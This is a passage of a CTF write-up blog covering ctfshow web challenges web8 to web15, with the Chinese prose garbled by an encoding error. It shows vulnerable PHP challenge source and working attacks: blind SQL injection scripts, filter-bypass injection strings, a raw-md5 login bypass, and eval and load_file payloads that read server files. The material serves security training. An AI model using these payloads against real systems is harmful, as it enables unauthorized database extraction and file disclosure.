class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>è®¿é—®<code>/robots.txt</code>çœ‹åˆ°<code>index.phps</code>ï¼Œæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($password)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>javisojä¸Šçš„ä¸€é“é¢˜ï¼Œè¯¦ç»†å‚è€ƒï¼š<a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login</a></p><p>ç›´æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:ffifdyop</span><br></pre></td></tr></table></figure><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>åŒæ ·è®¿é—®<code>index.phps</code>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span>&#123;</span><br><span class="line">     $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">     <span class="keyword">return</span> preg_replace($regex,<span class="string">&quot;&quot;</span>,$strParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">if</span>($password==$row[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒäº†æ›¿æ¢åçš„é•¿åº¦å’ŒåŸæ¥çš„é•¿åº¦ï¼Œä¸ç›¸ç­‰å°±é€€å‡ºç¨‹åºï¼Œè¿™é‡Œæœ‰ä¸ªå°trick</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906010914.png"></p><p>group byå¾ˆå¥½ç†è§£ï¼Œæ ¹æ®æŸä¸ªå­—æ®µåˆ†ç»„å˜›ï¼ŒåŠ ä¸Š<code>WITH ROLLUP</code>çš„æ„æ€å°±æ˜¯åœ¨groupåˆ†ç»„å­—æ®µçš„åŸºç¡€ä¸Šå†è¿›è¡Œç»Ÿè®¡æ•°æ®ï¼Œè¿™æ—¶å°±ä¼šå¤šå‡ºä¸€ä¸ª<code>NULL</code>å€¼</p><p>å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬åªéœ€ç”¨ä¸Šè¿™ä¸ªç‚¹å¹¶ä¸”è®¾ç½®passwordä¸ºç©ºå°±å¯ä»¥ç™»é™†ï¼Œç”±äºè¿‡æ»¤äº†ç©ºæ ¼éœ€è¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup#</span><br></pre></td></tr></table></figure><p><code>NULL</code>å¼±ç­‰äºç©ºå­—ç¬¦ä¸²ï¼Œç™»é™†æˆåŠŸ</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span>&#123;</span><br><span class="line">     $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">     <span class="keyword">return</span> preg_replace($regex,<span class="string">&quot;&quot;</span>,$strParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($password==$_SESSION[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>passwordå­˜åœ¨äºsessionä¸­ï¼Œåªéœ€æŒ‡å®šä¸€ä¸ªä¸å­˜åœ¨çš„session idï¼Œpasswordè®¾ç½®æˆç©ºå°±è¡Œï¼ŒåŒæ ·æ˜¯<code>NULL</code>å¼±ç­‰äºç©ºå­—ç¬¦</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906115810.png"></p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>æŸ¥çœ‹æºç ï¼Œæç¤º<code>?cmd=</code>ï¼Œç¬¬ä¸€æ¬¡ä»¥ä¸ºæ˜¯å‘½ä»¤æ‰§è¡Œï¼ŒæŸ¥çœ‹phpinfo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?cmd=show_source(&#x27;/var/www/html/index.php&#x27;);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ç›®å½•,è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;var_dump(scandir(&#39;.&#x2F;&#39;));</span><br><span class="line">?cmd&#x3D;show_source(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥ä¸è¿‡æ»¤<code>scandir</code>ï¼Œè¿‡æ»¤äº†å¯ä»¥ç”¨globåè®®ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p><code>.user.ini</code>ç»•è¿‡ï¼Œè¯¦ç»†å‚è€ƒï¼š<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn</a></p><p>è´´ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $size = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    $error = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    $arr = pathinfo($filename);</span><br><span class="line">    $ext_suffix = $arr[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($size &gt; <span class="number">24</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen($filename)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strlen($ext_suffix)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,$ext_suffix))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_name, <span class="string">&#x27;./&#x27;</span>.$filename))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = intval($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    <span class="keyword">switch</span> ($c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>ç”±äºswitchæ²¡æœ‰ç¢°åˆ°breakæ—¶ä¼šä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œç›´æ¥è®©<code>c</code>ç­‰äº3å°±èƒ½è¾“å‡º<code>$url</code>ï¼Œè®¿é—®ï¼ŒæŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, $_GET[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œweb7å·®ä¸å¤šï¼Œè·‘äº†ä¸‹ç‰ˆæœ¬å‘ç°æ˜¯ï¼š<code>10.2.26-MariaDB-log</code>ï¼Œæ‰€æœ‰æ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,web</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡<code>information_schema</code>ä¸­çš„å…¶ä»–è¡¨æ¥bypassï¼Œè¯¦ç»†å‚è€ƒï¼š<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb">https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//çˆ†è¡¨</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(TABLE_NAME)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.KEY_COLUMN_USAGE<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="keyword">DATABASE</span>()</span><br><span class="line"></span><br><span class="line">//çˆ†ç¬¬ä¸€åˆ—</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(COLUMN_NAME)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.KEY_COLUMN_USAGE<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="keyword">DATABASE</span>()<span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name=<span class="string">&#x27;content&#x27;</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±è¦æ— åˆ—åæ³¨å…¥äº†ï¼Œéœ€è¦å…ˆçŒœåˆ—æ•°ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fbae9ee1-b59d-4b25-a39d-0e4af175f5da.chall.ctf.show/here_1s_your_f1ag.php?query=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+p2)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥flagä¸åœ¨è¿™ï¼Œå…¶å®é‚£ä¸ªè¿‡æ»¤å¾ˆé¸¡è‚‹ï¼Œç›´æ¥åå¼•å·å°±å¯ä»¥ç»•è¿‡ï¼Œå¹¶ä¸”å¯ä»¥è”åˆæŸ¥è¯¢ï¼Œæ²™é›•äº†ï¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?query&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1%23</span><br><span class="line"></span><br><span class="line">?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;here_1s_your_f1ag.php&#39;)%23</span><br></pre></td></tr></table></figure><p><code>here_1s_your_f1ag.php</code>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> sql();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;query&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;query&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, $_GET[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$id = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql_ = <span class="string">&quot;select username from content where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">$db = <span class="keyword">new</span> sql();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.$db-&gt;getone($sql_)[<span class="number">0</span>].<span class="string">&quot;&#x27;)</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹<code>secret.php</code>å¾—åˆ°flagçš„ä½ç½®ï¼Œè¯»flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;real_flag_is_here&#39;)%23</span><br></pre></td></tr></table></figure><h3 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h3><h3 